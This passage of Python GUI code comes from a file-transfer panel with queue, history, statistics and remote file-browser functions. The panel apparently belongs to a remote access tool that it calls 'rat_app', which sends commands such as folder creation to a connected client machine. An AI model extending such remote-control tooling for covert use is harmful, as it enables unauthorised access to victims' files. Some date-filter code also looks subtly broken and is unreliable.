        # Add scrollbars
        y_scrollbar = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.queue_tree.yview)
        self.queue_tree.configure(yscroll=y_scrollbar.set)
        
        x_scrollbar = ttk.Scrollbar(tree_frame, orient=tk.HORIZONTAL, command=self.queue_tree.xview)
        self.queue_tree.configure(xscroll=x_scrollbar.set)
        
        # Pack components
        y_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.queue_tree.pack(side=tk.TOP, fill=tk.BOTH, expand=True)
        x_scrollbar.pack(side=tk.BOTTOM, fill=tk.X)
        
        # Create context menu for queue
        self.create_queue_context_menu()
        
        # Item action buttons
        action_frame = ctk.CTkFrame(queue_container, fg_color="transparent")
        action_frame.pack(fill=tk.X, padx=0, pady=10)
        
        process_btn = ctk.CTkButton(action_frame, text="Process Selected", 
                                 command=self.process_selected_queue,
                                 fg_color=theme["accent_color"],
                                 hover_color=theme["hover_color"],
                                 corner_radius=8, height=36)
        process_btn.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
        
        remove_btn = ctk.CTkButton(action_frame, text="Remove Selected", 
                                command=self.remove_from_queue,
                                fg_color=theme["button_color"],
                                hover_color=theme["hover_color"],
                                corner_radius=8, height=36)
        remove_btn.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
    
    def setup_history_tab(self):
        """Create a transfer history tab for completed operations."""
        theme = self.get_theme_colors()
        
        # Container with padding
        history_container = ctk.CTkFrame(self.history_frame, fg_color="transparent")
        history_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # History header
        history_header = ctk.CTkFrame(history_container, fg_color=theme["card_color"],
                                   corner_radius=10)
        history_header.pack(fill=tk.X, padx=0, pady=10)
        
        header_title = ctk.CTkFrame(history_header, fg_color="transparent")
        header_title.pack(fill=tk.X, padx=15, pady=(10, 5))
        
        title_label = ctk.CTkLabel(header_title, text=" Transfer History", 
                                font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                               size=FONT_STYLES["subheading"][1], 
                                               weight=FONT_STYLES["subheading"][2]))
        title_label.pack(side=tk.LEFT, anchor="w")
        
        # Filter controls
        filter_frame = ctk.CTkFrame(history_header, fg_color="transparent")
        filter_frame.pack(fill=tk.X, padx=15, pady=(0, 10))
        
        # Date range selector
        date_label = ctk.CTkLabel(filter_frame, text="Date Range:")
        date_label.pack(side=tk.LEFT, padx=5)
        
        self.date_range_var = tk.StringVar(value="All Time")
        date_range = ctk.CTkOptionMenu(filter_frame, values=["Today", "Last 7 Days", "Last 30 Days", "All Time"],
                                    variable=self.date_range_var,
                                    command=self.filter_history,
                                    width=120, height=28,
                                    fg_color=theme["button_color"],
                                    button_color=theme["hover_color"])
        date_range.pack(side=tk.LEFT, padx=5)
        
        # Type filter
        type_label = ctk.CTkLabel(filter_frame, text="Type:")
        type_label.pack(side=tk.LEFT, padx=5)
        
        self.type_filter_var = tk.StringVar(value="All")
        type_filter = ctk.CTkOptionMenu(filter_frame, values=["All", "Upload", "Download"],
                                     variable=self.type_filter_var,
                                     command=self.filter_history,
                                     width=100, height=28,
                                     fg_color=theme["button_color"],
                                     button_color=theme["hover_color"])
        type_filter.pack(side=tk.LEFT, padx=5)
        
        # Export and clear buttons
        self.clear_history_btn = ctk.CTkButton(filter_frame, text="Clear History", 
                                          command=self.clear_history,
                                          fg_color=theme["button_color"],
                                          hover_color=theme["hover_color"],
                                          width=100, height=28,
                                          corner_radius=6)
        self.clear_history_btn.pack(side=tk.RIGHT, padx=5)
        
        export_btn = ctk.CTkButton(filter_frame, text="Export", 
                               command=self.export_history,
                               fg_color=theme["button_color"],
                               hover_color=theme["hover_color"],
                               width=80, height=28,
                               corner_radius=6)
        export_btn.pack(side=tk.RIGHT, padx=5)
        
        # Create notebook for different history views
        self.history_notebook = ttk.Notebook(history_container, style="Custom.TNotebook")
        self.history_notebook.pack(fill=tk.BOTH, expand=True, padx=0, pady=10)
        
        # List view
        list_frame = ctk.CTkFrame(self.history_notebook, fg_color=theme["bg_color"])
        self.history_notebook.add(list_frame, text="List View")
        
        # Create treeview for history
        tree_frame = ctk.CTkFrame(list_frame, fg_color=theme["card_color"],
                               corner_radius=10)
        tree_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        columns = ("Date", "Time", "Type", "File", "Size", "Destination", "Status", "Duration")
        self.history_tree = ttk.Treeview(tree_frame, columns=columns, show="headings", style="Custom.Treeview")
        
        # Define headings with click-to-sort capability
        for col in columns:
            self.history_tree.heading(col, text=col, command=lambda c=col: self.sort_treeview(self.history_tree, c))
            
        # Adjust column widths
        self.history_tree.column("Date", width=100)
        self.history_tree.column("Time", width=80)
        self.history_tree.column("Type", width=80)
        self.history_tree.column("File", width=200)
        self.history_tree.column("Size", width=80)
        self.history_tree.column("Destination", width=200)
        self.history_tree.column("Status", width=80)
        self.history_tree.column("Duration", width=80)
        
        # Add scrollbars
        y_scrollbar = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.history_tree.yview)
        self.history_tree.configure(yscroll=y_scrollbar.set)
        
        x_scrollbar = ttk.Scrollbar(tree_frame, orient=tk.HORIZONTAL, command=self.history_tree.xview)
        self.history_tree.configure(xscroll=x_scrollbar.set)
        
        # Pack components
        y_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.history_tree.pack(side=tk.TOP, fill=tk.BOTH, expand=True)
        x_scrollbar.pack(side=tk.BOTTOM, fill=tk.X)
        
        # Stats view tab
        stats_frame = ctk.CTkFrame(self.history_notebook, fg_color=theme["bg_color"])
        self.history_notebook.add(stats_frame, text="Statistics")
        
        # Add stats widgets
        self.setup_history_stats(stats_frame)
    
    def setup_history_stats(self, parent_frame):
        """Create statistics view for the history tab."""
        theme = self.get_theme_colors()
        
        # Create stats cards
        stats_container = ctk.CTkFrame(parent_frame, fg_color="transparent")
        stats_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Top row of stat cards
        top_row = ctk.CTkFrame(stats_container, fg_color="transparent")
        top_row.pack(fill=tk.X, pady=10)
        
        # Card 1 - Upload Stats
        upload_card = ctk.CTkFrame(top_row, fg_color=theme["card_color"],
                               corner_radius=10)
        upload_card.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5)
        
        upload_title = ctk.CTkLabel(upload_card, text=" Upload Statistics", 
                                 font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                size=FONT_STYLES["subheading"][1], 
                                                weight=FONT_STYLES["subheading"][2]))
        upload_title.pack(anchor="w", padx=15, pady=10)
        
        self.upload_stats_label = ctk.CTkLabel(upload_card, text="Total: 0 files\nSize: 0 B",
                                          font=ctk.CTkFont(size=16),
                                          justify="left")
        self.upload_stats_label.pack(anchor="w", padx=15, pady=10)
        
        # Card 2 - Download Stats
        download_card = ctk.CTkFrame(top_row, fg_color=theme["card_color"],
                                 corner_radius=10)
        download_card.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5)
        
        download_title = ctk.CTkLabel(download_card, text=" Download Statistics", 
                                   font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                  size=FONT_STYLES["subheading"][1], 
                                                  weight=FONT_STYLES["subheading"][2]))
        download_title.pack(anchor="w", padx=15, pady=10)
        
        self.download_stats_label = ctk.CTkLabel(download_card, text="Total: 0 files\nSize: 0 B",
                                            font=ctk.CTkFont(size=16),
                                            justify="left")
        self.download_stats_label.pack(anchor="w", padx=15, pady=10)
        
        # Card 3 - Overall Stats
        overall_card = ctk.CTkFrame(top_row, fg_color=theme["card_color"],
                                corner_radius=10)
        overall_card.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5)
        
        overall_title = ctk.CTkLabel(overall_card, text=" Overall Statistics", 
                                  font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                 size=FONT_STYLES["subheading"][1], 
                                                 weight=FONT_STYLES["subheading"][2]))
        overall_title.pack(anchor="w", padx=15, pady=10)
        
        self.overall_stats_label = ctk.CTkLabel(overall_card, 
                                           text="Success Rate: 0%\nAvg. Speed: 0 B/s",
                                           font=ctk.CTkFont(size=16),
                                           justify="left")
        self.overall_stats_label.pack(anchor="w", padx=15, pady=10)
        
        # Bottom row for charts
        charts_row = ctk.CTkFrame(stats_container, fg_color=theme["card_color"],
                               corner_radius=10, height=300)
        charts_row.pack(fill=tk.BOTH, expand=True, padx=5, pady=10)
        charts_row.pack_propagate(False)  # Prevent shrinking
        
        charts_title = ctk.CTkLabel(charts_row, text=" Transfer Activity", 
                                 font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                size=FONT_STYLES["subheading"][1], 
                                                weight=FONT_STYLES["subheading"][2]))
        charts_title.pack(anchor="w", padx=15, pady=10)
        
        # Placeholder for chart - would be implemented with a charting library
        chart_placeholder = ctk.CTkLabel(charts_row, text="Activity chart will appear here",
                                     font=ctk.CTkFont(size=14))
        chart_placeholder.pack(pady=100)
    
    def setup_status_section(self, theme):
        """Create an enhanced status section with more metrics and controls."""
        self.status_card = ctk.CTkFrame(self.file_frame, fg_color=theme["card_color"],
                                 corner_radius=10)
        self.status_card.pack(fill=tk.X, padx=15, pady=15)
        
        # First row with status and controls
        status_header = ctk.CTkFrame(self.status_card, fg_color="transparent")
        status_header.pack(fill=tk.X, padx=15, pady=(10, 5))
        
        status_title = ctk.CTkLabel(status_header, text=" Transfer Status", 
                                  font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                 size=FONT_STYLES["subheading"][1], 
                                                 weight=FONT_STYLES["subheading"][2]))
        status_title.pack(side=tk.LEFT, anchor="w")
        
        # Current status
        status_frame = ctk.CTkFrame(self.status_card, fg_color="transparent")
        status_frame.pack(fill=tk.X, padx=15, pady=(0, 5))
        
        status_label = ctk.CTkLabel(status_frame, text="Status:", 
                                  font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                                 size=FONT_STYLES["normal"][1], 
                                                 weight="bold"))
        status_label.pack(side=tk.LEFT, padx=5)
        
        self.status_value = ctk.CTkLabel(status_frame, text="Idle",
                                      font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                                     size=FONT_STYLES["normal"][1]))
        self.status_value.pack(side=tk.LEFT, padx=5)
        
        # Transfer metrics
        metrics_frame = ctk.CTkFrame(self.status_card, fg_color="transparent")
        metrics_frame.pack(fill=tk.X, padx=15, pady=(0, 5))
        
        # Speed indicator
        speed_container = ctk.CTkFrame(metrics_frame, fg_color="transparent")
        speed_container.pack(side=tk.LEFT, padx=10)
        
        speed_label_text = ctk.CTkLabel(speed_container, text="Speed:", 
                                     font=ctk.CTkFont(weight="bold"))
        speed_label_text.pack(side=tk.LEFT, padx=2)
        
        self.speed_label = ctk.CTkLabel(speed_container, text="0 B/s")
        self.speed_label.pack(side=tk.LEFT, padx=2)
        
        # ETA indicator
        eta_container = ctk.CTkFrame(metrics_frame, fg_color="transparent")
        eta_container.pack(side=tk.LEFT, padx=10)
        
        eta_label_text = ctk.CTkLabel(eta_container, text="ETA:", 
                                   font=ctk.CTkFont(weight="bold"))
        eta_label_text.pack(side=tk.LEFT, padx=2)
        
        self.eta_label = ctk.CTkLabel(eta_container, text="--:--")
        self.eta_label.pack(side=tk.LEFT, padx=2)
        
        # Progress indicators row
        progress_frame = ctk.CTkFrame(self.status_card, fg_color="transparent")
        progress_frame.pack(fill=tk.X, padx=15, pady=(5, 10))
        
        # Enhanced progress bar with percentage
        progress_container = ctk.CTkFrame(progress_frame, fg_color="transparent")
        progress_container.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        progress_top = ctk.CTkFrame(progress_container, fg_color="transparent")
        progress_top.pack(fill=tk.X)
        
        self.progress_text = ctk.CTkLabel(progress_top, text="0%", anchor="e")
        self.progress_text.pack(side=tk.RIGHT, padx=5)
        
        self.progress_details = ctk.CTkLabel(progress_top, text="0 B / 0 B", anchor="w")
        self.progress_details.pack(side=tk.LEFT, padx=5)
        
        self.progress_bar = ctk.CTkProgressBar(progress_container, height=15, corner_radius=8,
                                           progress_color=theme["accent_color"])
        self.progress_bar.pack(fill=tk.X, pady=5)
        self.progress_bar.set(0)
        
        # Control buttons
        buttons_frame = ctk.CTkFrame(progress_frame, fg_color="transparent")
        buttons_frame.pack(side=tk.RIGHT, padx=5)
        
        # Pause/Resume toggle
        self.pause_btn = ctk.CTkButton(buttons_frame, text="Pause", 
                                   command=self.toggle_pause_resume,
                                   state="disabled", width=80,
                                   fg_color=theme["button_color"],
                                   hover_color=theme["hover_color"],
                                   corner_radius=8)
        self.pause_btn.pack(side=tk.LEFT, padx=5)
        
        # Resume saved transfers
        self.resume_btn = ctk.CTkButton(buttons_frame, text="Resume", 
                                    command=self.show_resume_dialog, 
                                    state="disabled", width=80,
                                    fg_color=theme["button_color"],
                                    hover_color=theme["hover_color"],
                                    corner_radius=8)
        self.resume_btn.pack(side=tk.LEFT, padx=5)
        
        # Cancel button
        self.cancel_btn = ctk.CTkButton(buttons_frame, text="Cancel", 
                                    command=self.cancel_transfer, 
                                    state="disabled", width=80,
                                    fg_color=theme["danger_color"],
                                    hover_color=theme["hover_color"],
                                    corner_radius=8)
        self.cancel_btn.pack(side=tk.LEFT, padx=5)
    
    def configure_treeview_style(self, theme):
        """Configure unified treeview styling."""
        style = ttk.Style()
        style.configure("Custom.Treeview", 
                        background=theme["bg_color"],
                        foreground=theme["fg_color"],
                        fieldbackground=theme["card_color"],
                        borderwidth=0,
                        highlightthickness=0)
        
        style.map("Custom.Treeview",
                background=[("selected", theme["accent_color"])],
                foreground=[("selected", "#FFFFFF")])
        
        style.configure("Custom.Treeview.Heading",
                       background=theme["card_color"],
                       foreground=theme["fg_color"],
                       borderwidth=1)
        
        style.map("Custom.Treeview.Heading",
                 background=[("active", theme["hover_color"])])
        
        # Configure scrollbar style
        style.configure("Custom.Vertical.TScrollbar", 
                       background=theme["bg_color"],
                       troughcolor=theme["bg_color"],
                       arrowcolor=theme["fg_color"])
        
        style.configure("Custom.Horizontal.TScrollbar", 
                       background=theme["bg_color"],
                       troughcolor=theme["bg_color"],
                       arrowcolor=theme["fg_color"])
    
    def bind_events(self):
        """Bind events for enhanced interactivity."""
        # Bind filter entry to apply filter on keyup
        if hasattr(self, 'filter_entry'):
            self.filter_entry.bind("<KeyRelease>", self.apply_file_filter)
        
        # Bind selection events to update buttons and counters
        if hasattr(self, 'files_tree'):
            self.files_tree.bind("<<TreeviewSelect>>", self.update_selection_count)
        
        if hasattr(self, 'queue_tree'):
            self.queue_tree.bind("<<TreeviewSelect>>", self.update_queue_selection)
        
        # Bind notebook tab change to update the UI for the current tab
        self.transfer_notebook.bind("<<NotebookTabChanged>>", self.on_tab_changed)
    
    def create_treeview_context_menu(self, treeview):
        """Create a context menu for treeview operations."""
        self.context_menu = tk.Menu(treeview, tearoff=0)
        self.context_menu.add_command(label="Download", command=self.download_file)
        self.context_menu.add_command(label="Add to Queue", command=self.add_to_queue)
        self.context_menu.add_separator()
        self.context_menu.add_command(label="Create Folder", command=self.create_remote_folder)
        self.context_menu.add_command(label="Rename", command=self.rename_remote_file)
        self.context_menu.add_command(label="Delete", command=self.delete_remote_file)
        self.context_menu.add_separator()
        self.context_menu.add_command(label="Copy Path", command=self.copy_path_to_clipboard)
        self.context_menu.add_command(label="Refresh", command=self.list_remote_files)
    
    def create_queue_context_menu(self):
        """Create a context menu for queue operations."""
        self.queue_menu = tk.Menu(self.queue_tree, tearoff=0)
        self.queue_menu.add_command(label="Process Now", command=self.process_selected_queue)
        self.queue_menu.add_command(label="Remove", command=self.remove_from_queue)
        self.queue_menu.add_separator()
        self.queue_menu.add_command(label="Move Up", command=lambda: self.move_queue_item("up"))
        self.queue_menu.add_command(label="Move Down", command=lambda: self.move_queue_item("down"))
        self.queue_menu.add_separator()
        self.queue_menu.add_command(label="Change Priority", command=self.change_queue_priority)
    
    #--------------------------------------------------------
    # Event Handlers and UI Update Methods
    #--------------------------------------------------------
    
    def show_context_menu(self, event):
        """Show the context menu on right-click."""
        if hasattr(self, 'context_menu'):
            try:
                # Select the item under the cursor
                item = self.files_tree.identify_row(event.y)
                if item:
                    self.files_tree.selection_set(item)
                    self.context_menu.post(event.x_root, event.y_root)
            except:
                pass
    
    def show_queue_context_menu(self, event):
        """Show the queue context menu on right-click."""
        if hasattr(self, 'queue_menu'):
            try:
                # Select the item under the cursor
                item = self.queue_tree.identify_row(event.y)
                if item:
                    self.queue_tree.selection_set(item)
                    self.queue_menu.post(event.x_root, event.y_root)
            except:
                pass
    
    def on_tab_changed(self, event):
        """Handle actions when notebook tab is changed."""
        # Get the selected tab
        selected_tab = self.transfer_notebook.select()
        tab_id = self.transfer_notebook.index(selected_tab)
        
        # Perform tab-specific actions
        if tab_id == 0:  # Upload tab
            pass  # Any upload tab specific actions
        elif tab_id == 1:  # Download tab
            # Refresh file listing if client is connected
            if self.rat_app.current_client_socket:
                self.list_remote_files()
        elif tab_id == 2:  # Queue tab
            self.update_queue_display()
        elif tab_id == 3:  # History tab
            self.update_history_display()
    
    def update_selection_count(self, event=None):
        """Update the selection count indicator."""
        if hasattr(self, 'selection_count') and hasattr(self, 'files_tree'):
            selection = self.files_tree.selection()
            count = len(selection)
            
            if count == 0:
                self.selection_count.configure(text="No files selected")
            elif count == 1:
                item = self.files_tree.item(selection[0])
                file_type = item['values'][2] if len(item['values']) > 2 else ""
                if file_type.lower() == "folder":
                    self.selection_count.configure(text="1 folder selected")
                else:
                    self.selection_count.configure(text="1 file selected")
            else:
                self.selection_count.configure(text=f"{count} items selected")
    
    def update_queue_selection(self, event=None):
        """Update UI based on queue item selection."""
        if hasattr(self, 'queue_tree'):
            selection = self.queue_tree.selection()
            # Enable/disable buttons based on selection
            has_selection = len(selection) > 0
            # Update any relevant controls...
    
    def update_queue_display(self):
        """Update the queue display with current queue items."""
        if not hasattr(self, 'queue_tree'):
            return
            
        # Clear existing items
        for item in self.queue_tree.get_children():
            self.queue_tree.delete(item)
            
        # Check if we have any queue items
        if not hasattr(self, 'queue_items'):
            self.queue_items = []
            
        # Populate with queue items
        for i, item in enumerate(self.queue_items):
            self.queue_tree.insert("", "end", values=(
                i+1,
                item.get('type', 'Unknown'),
                item.get('source', ''),
                item.get('destination', ''),
                item.get('size', '0 B'),
                item.get('priority', 'Normal'),
                item.get('status', 'Pending')
            ))
            
        # Update queue count
        if hasattr(self, 'queue_count'):
            count = len(self.queue_items)
            self.queue_count.configure(text=f"{count} {'item' if count == 1 else 'items'}")
    
    def update_history_display(self):
        """Update the history display with transfer history."""
        if not hasattr(self, 'history_tree'):
            return
            
        # Clear existing items
        for item in self.history_tree.get_children():
            self.history_tree.delete(item)
            
        # Check if we have history items
        if not hasattr(self, 'history_items'):
            self.history_items = []
            
        # Filter history based on current filters
        filtered_items = self.filter_history_items()
            
        # Populate with history items
        for item in filtered_items:
            self.history_tree.insert("", "end", values=(
                item.get('date', ''),
                item.get('time', ''),
                item.get('type', ''),
                item.get('file', ''),
                item.get('size', ''),
                item.get('destination', ''),
                item.get('status', ''),
                item.get('duration', '')
            ))
            
        # Update statistics display
        self.update_history_stats(filtered_items)
    
    def update_history_stats(self, history_items):
        """Update the statistics view with calculated stats."""
        if not history_items:
            # Set default "no data" values
            if hasattr(self, 'upload_stats_label'):
                self.upload_stats_label.configure(text="Total: 0 files\nSize: 0 B")
            if hasattr(self, 'download_stats_label'):
                self.download_stats_label.configure(text="Total: 0 files\nSize: 0 B")
            if hasattr(self, 'overall_stats_label'):
                self.overall_stats_label.configure(text="Success Rate: 0%\nAvg. Speed: 0 B/s")
            return
        
        # Calculate stats for uploads
        upload_items = [item for item in history_items if item.get('type') == 'Upload']
        upload_count = len(upload_items)
        upload_size = sum(self.parse_size(item.get('size', '0 B')) for item in upload_items)
        
        # Calculate stats for downloads
        download_items = [item for item in history_items if item.get('type') == 'Download']
        download_count = len(download_items)
        download_size = sum(self.parse_size(item.get('size', '0 B')) for item in download_items)
        
        # Calculate overall stats
        total_count = len(history_items)
        successful_items = [item for item in history_items if item.get('status') == 'Complete']
        success_rate = (len(successful_items) / total_count * 100) if total_count > 0 else 0
        
        # Calculate average speed
        total_bytes = upload_size + download_size
        total_duration_sec = sum(self.parse_duration(item.get('duration', '0s')) for item in history_items)
        avg_speed = total_bytes / total_duration_sec if total_duration_sec > 0 else 0
        
        # Update UI labels
        if hasattr(self, 'upload_stats_label'):
            self.upload_stats_label.configure(
                text=f"Total: {upload_count} {'file' if upload_count == 1 else 'files'}\n"
                     f"Size: {self.format_size(upload_size)}"
            )
        
        if hasattr(self, 'download_stats_label'):
            self.download_stats_label.configure(
                text=f"Total: {download_count} {'file' if download_count == 1 else 'files'}\n"
                     f"Size: {self.format_size(download_size)}"
            )
        
        if hasattr(self, 'overall_stats_label'):
            self.overall_stats_label.configure(
                text=f"Success Rate: {success_rate:.1f}%\n"
                     f"Avg. Speed: {self.format_size(avg_speed)}/s"
            )
    
    def filter_history_items(self):
        """Filter history items based on current filter settings."""
        if not hasattr(self, 'history_items'):
            return []
            
        # Start with all items
        filtered_items = self.history_items.copy()
        
        # Apply date range filter
        if hasattr(self, 'date_range_var'):
            date_range = self.date_range_var.get()
            if date_range != "All Time":
                # Get current date
                today = datetime.now().date()
                
                if date_range == "Today":
                    filtered_items = [item for item in filtered_items 
                                     if self.parse_date(item.get('date', '')) == today]
                elif date_range == "Last 7 Days":
                    cutoff_date = today - datetime.timedelta(days=7)
                    filtered_items = [item for item in filtered_items 
                                     if self.parse_date(item.get('date', '')) >= cutoff_date]
                elif date_range == "Last 30 Days":
                    cutoff_date = today - datetime.timedelta(days=30)
                    filtered_items = [item for item in filtered_items 
                                     if self.parse_date(item.get('date', '')) >= cutoff_date]
        
        # Apply type filter
        if hasattr(self, 'type_filter_var'):
            type_filter = self.type_filter_var.get()
            if type_filter != "All":
                filtered_items = [item for item in filtered_items 
                                 if item.get('type', '') == type_filter]
        
        return filtered_items
    
    def parse_date(self, date_str):
        """Parse date string into datetime.date object."""
        try:
            return datetime.strptime(date_str, "%Y-%m-%d").date()
        except:
            return datetime.now().date()
    
    def parse_size(self, size_str):
        """Parse size string like '1.5 MB' into bytes."""
        try:
            # Split into number and unit
            parts = size_str.split()
            if len(parts) != 2:
                return 0
                
            size_val = float(parts[0])
            unit = parts[1]
            
            # Convert to bytes based on unit
            units = {'B': 1, 'KB': 1024, 'MB': 1024**2, 'GB': 1024**3, 'TB': 1024**4}
            return size_val * units.get(unit, 1)
        except:
            return 0
    
    def parse_duration(self, duration_str):
        """Parse duration string like '1m 30s' into seconds."""
        try:
            total_seconds = 0
            # Check for minutes
            if 'm' in duration_str:
                min_parts = duration_str.split('m')
                total_seconds += int(min_parts[0]) * 60
                duration_str = min_parts[1]
            
            # Check for seconds
            if 's' in duration_str:
                sec_parts = duration_str.split('s')
                if sec_parts[0].strip():
                    total_seconds += int(sec_parts[0])
            
            return total_seconds or 1  # Avoid division by zero
        except:
            return 1  # Default to 1 second
    
    def apply_file_filter(self, event=None):
        """Apply filter to the remote files view."""
        if not hasattr(self, 'filter_entry') or not hasattr(self, 'files_tree'):
            return
            
        filter_text = self.filter_entry.get().lower()
        
        # If we have original data stored, use it
        if not hasattr(self, 'original_file_data'):
            # No original data to filter
            return
            
        # Clear current tree
        for item in self.files_tree.get_children():
            self.files_tree.delete(item)
            
        # Apply filter and repopulate
        for file_info in self.original_file_data:
            # Skip hidden files unless show_hidden is enabled
            if not self.show_hidden_files and file_info[0].startswith('.'):
                continue
                
            # Check if any part of the file info matches the filter
            if any(filter_text in str(value).lower() for value in file_info):
                self.files_tree.insert("", "end", values=file_info)
        
        # Update file count
        item_count = len(self.files_tree.get_children())
        if hasattr(self, 'file_count_label'):
            self.file_count_label.configure(text=f"{item_count} {'item' if item_count == 1 else 'items'}")
    
    def toggle_hidden_files(self):
        """Toggle showing hidden files."""
        theme = self.get_theme_colors()
        self.show_hidden_files = not self.show_hidden_files
        
        # Update button appearance
        if hasattr(self, 'toggle_hidden_btn'):
            self.toggle_hidden_btn.configure(
                fg_color=theme["accent_color"] if self.show_hidden_files else theme["button_color"]
            )
            
        # Refresh file list with new setting
        self.apply_file_filter()
    
    def sort_treeview(self, treeview, column):
        """Sort treeview by the specified column."""
        # Get all items with their values
        data = [(treeview.item(item, "values"), item) for item in treeview.get_children("")]
        
        # Determine column index
        if isinstance(column, str):
            columns = treeview["columns"]
            column_idx = columns.index(column)
        else:
            column_idx = column
            
        # Remember current sort settings
        if hasattr(self, 'current_sort_column') and self.current_sort_column == column:
            # Toggle direction if same column
            self.sort_direction = "descending" if self.sort_direction == "ascending" else "ascending"
        else:
            # New column, reset to ascending
            self.current_sort_column = column
            self.sort_direction = "ascending"
        
        # Sort by the specified column
        reverse_sort = self.sort_direction == "descending"
        
        # Special handling for different column types
        if column in ["Size", "Modified"]:
            # For size column, extract numeric value for sorting
            if column == "Size":
                # Custom sort function for size values
                def get_size_value(item_data):
                    size_str = item_data[0][column_idx]
                    return self.parse_size(size_str)
                
                data.sort(key=get_size_value, reverse=reverse_sort)
            else:
                # Date sorting
                data.sort(key=lambda x: x[0][column_idx], reverse=reverse_sort)
        else:
            # Regular string sorting
            data.sort(key=lambda x: x[0][column_idx].lower() if isinstance(x[0][column_idx], str) else x[0][column_idx], 
                     reverse=reverse_sort)
        
        # Special handling for folders to always appear first
        if column == "Name" and "Type" in treeview["columns"]:
            type_idx = treeview["columns"].index("Type")
            
            # Separate folders and files
            folders = [item for item in data if item[0][type_idx].lower() == "folder"]
            files = [item for item in data if item[0][type_idx].lower() != "folder"]
            
            # Sort each group separately
            folders.sort(key=lambda x: x[0][column_idx].lower(), reverse=reverse_sort)
            files.sort(key=lambda x: x[0][column_idx].lower(), reverse=reverse_sort)
            
            # Combine with folders first
            data = folders + files
        
        # Clear and repopulate the treeview
        for item in treeview.get_children(""):
            treeview.delete(item)
            
        for item_values, item_id in data:
            treeview.insert("", "end", values=item_values)
        
        # Update column heading to show sort direction
        for col in treeview["columns"]:
            if col == column:
                direction_indicator = " " if self.sort_direction == "ascending" else " "
                treeview.heading(col, text=f"{col}{direction_indicator}")
            else:
                # Remove indicators from other columns
                treeview.heading(col, text=col.replace(" ", "").replace(" ", ""))
    
    #--------------------------------------------------------
    # Helper Methods and Utilities
    #--------------------------------------------------------
    
    def clear_file_info(self):
        """Clear the file information display."""
        if hasattr(self, 'upload_info_text'):
            self.upload_info_text.configure(state="normal")
            self.upload_info_text.delete(1.0, tk.END)
            self.upload_info_text.configure(state="disabled")
    
    def toggle_multiple_files_mode(self):
        """Toggle between single and multiple file upload mode."""
        # Implementation depends on how multiple file upload is handled
        is_multiple = self.multiple_files_var.get()
        
        if is_multiple:
            # Update UI for multiple file selection
            if hasattr(self, 'upload_btn'):
                self.upload_btn.configure(text="Upload Files")
        else:
            # Update UI for single file selection
            if hasattr(self, 'upload_btn'):
                self.upload_btn.configure(text="Upload File")
    
    def show_recent_paths(self):
        """Show a popup with recent destination paths."""
        # Implementation would depend on storing and retrieving recent paths
        pass
    
    def show_bookmarks(self):
        """Show a popup with bookmarked remote locations."""
        # Implementation would depend on storing and retrieving bookmarks
        pass
    
    def navigate_back(self):
        """Navigate to parent directory in remote file browser."""
        if not hasattr(self, 'remote_path_entry'):
            return
            
        current_path = self.remote_path_entry.get()
        
        # Handle both slash types
        if '\\' in current_path:
            separator = '\\'
        else:
            separator = '/'
            
        # Remove trailing separator if it exists
        if current_path.endswith(separator):
            current_path = current_path[:-1]
            
        # Find last separator
        last_sep_index = current_path.rfind(separator)
        if last_sep_index > 0:
            # Navigate to parent directory
            parent_path = current_path[:last_sep_index + 1]  # Keep the separator
            self.remote_path_entry.delete(0, tk.END)
            self.remote_path_entry.insert(0, parent_path)
            
            # Refresh the file list
            self.list_remote_files()
    
    def create_remote_folder(self):
        """Create a new folder on the remote system with improved error handling."""
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
            
        # Get current path
        current_path = self.remote_path_entry.get()
        
        # Ask for folder name with validation
        folder_name = simpledialog.askstring("Create Folder", "Enter folder name:")
        if not folder_name:
            return
            
        # Validate folder name (no illegal characters)
        invalid_chars = ['<', '>', ':', '"', '/', '\\', '|', '?', '*']
        if any(char in folder_name for char in invalid_chars):
            messagebox.showerror("Invalid Name", "Folder name contains invalid characters")
            return
            
        # Ensure path ends with separator
        if not current_path.endswith('\\') and not current_path.endswith('/'):
            if '\\' in current_path:
                current_path += '\\'
            else:
                current_path += '/'
                
        # Full path for new folder
        new_folder_path = current_path + folder_name
        
        # Send command to create folder
        try:
            command = f"MKDIR|{new_folder_path}"
            self.rat_app.current_client_socket.send(command.encode())
            
            # Set timeout for response
            self.rat_app.current_client_socket.settimeout(10)
            
            try:
                # Wait for response
                response = self.rat_app.current_client_socket.recv(1024).decode()
                
                if response.startswith("SUCCESS"):
                    self.rat_app.log(f"Created folder: {new_folder_path}")
                    # Refresh file list
                    self.list_remote_files()
                else:
                    self.rat_app.log(f"Failed to create folder: {response}")
                    messagebox.showerror("Error", f"Failed to create folder: {response}")
            except socket.timeout:
                self.rat_app.log("Timeout waiting for create folder response")
                messagebox.showerror("Error", "Connection timeout")
            finally:
                self.rat_app.current_client_socket.settimeout(None)
                    
        except Exception as e:
            self.rat_app.log(f"Error creating folder: {e}")
            messagebox.showerror("Error", f"Error creating folder: {e}")
        
    def rename_remote_file(self):
        """Rename a file or folder on the remote system."""
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
            
        # Get selected item
        selection = self.files_tree.selection()
        if not selection:
            messagebox.showinfo("No Selection", "Please select a file or folder to rename")
            return
            
        # Get item information
        item = self.files_tree.item(selection[0])
